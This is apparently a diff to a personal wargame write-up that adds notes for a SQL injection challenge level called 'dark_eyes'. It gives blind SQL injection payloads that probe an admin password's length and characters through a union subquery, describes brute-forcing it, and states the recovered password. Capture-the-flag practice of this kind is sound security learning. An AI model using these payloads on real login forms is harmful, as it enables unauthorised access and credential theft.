@@ -144,6 +144,14 @@ level-21 (iron_golem):
   -> the level is cleared.
 
 level-22 (dark_eyes):
+  -> we found that if we enter a incorrect msg then the page exists where as if it is correct then it displays blank page.
+  -> let pw=' or (select 1 union select 2 where id='admin' and lenght(pw)>7)-- -
+  -> since the length of the pass is >7 it returns blank page else the page exists as such.
+  -> now pw=' or (select 1 union select 2 where id='admin' and substring(pw,1,1)='1')-- -
+  -> brute force it and get the pass. ( pw=5a2f5d3c ) 
+  -> the level is cleared.
+
+level-23 (hell_fire):
   -> 
 
 
